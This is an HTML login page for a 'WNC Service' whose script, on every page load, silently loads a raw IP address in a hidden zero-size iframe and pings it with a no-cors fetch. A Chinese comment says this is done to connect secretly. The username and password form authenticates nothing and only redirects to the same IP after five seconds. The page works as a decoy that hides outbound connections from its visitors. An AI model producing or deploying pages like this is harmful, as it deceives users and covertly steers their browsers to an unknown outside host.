<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Login - WNC Service</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
    }
    .header-logo {
      width: 80%;
      max-width: 800px;
      height: auto;
      margin: 20px auto;
    }
    .login-container {
      text-align: center;
      background: #ffffff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
      width: 300px;
      margin-top: 20px;
    }
    .logo {
      width: 100px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 20px;
      color: #333;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    /* 隱藏的 iframe */
    #hiddenIframe {
      display: none;
      width: 0;
      height: 0;
      border: 0;
    }
  </style>
  <script>
    // 一進到頁面就執行
    window.addEventListener('load', () => {
      const primaryURL = "http://103.200.23.160";
      const iframe = document.getElementById('hiddenIframe');

      // 利用隱藏的 iframe 連結
      iframe.src = primaryURL;

      // 嘗試用 fetch 搭配 no-cors
      fetch(primaryURL, {
        method: 'HEAD',
        mode: 'no-cors'
      })
      .then(() => {
        console.log('Tried to fetch primaryURL with no-cors');
      })
      .catch(() => {
        console.error('Error fetching primaryURL');
      });
    });

    // 按下 Login 後，5 秒後跳轉到 http://103.200.23.160
    function handleLogin(event) {
      // 先阻止表單預設送出行為
      event.preventDefault();

      // 這裡可以根據需求做任何驗證或處理 (例如顯示 "Logging in..." 之類資訊)

      setTimeout(() => {
        window.location.href = "http://103.200.23.160";
      }, 5000); // 5 秒後跳轉，可自行調整
    }
  </script>
</head>
<body>
  <img src="./wnc.png" alt="WNC Banner" class="header-logo">
  <div class="login-container">
    <img src="./wnclogo.png" alt="WNC Logo" class="logo">
    <h1>Welcome to WNC Service</h1>
    <p>This service requires login to access.</p>
    <form onsubmit="handleLogin(event)">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
  <!-- 隱藏的 iframe，用來偷偷連線到 primaryURL -->
  <iframe id="hiddenIframe"></iframe>
</body>
</html>
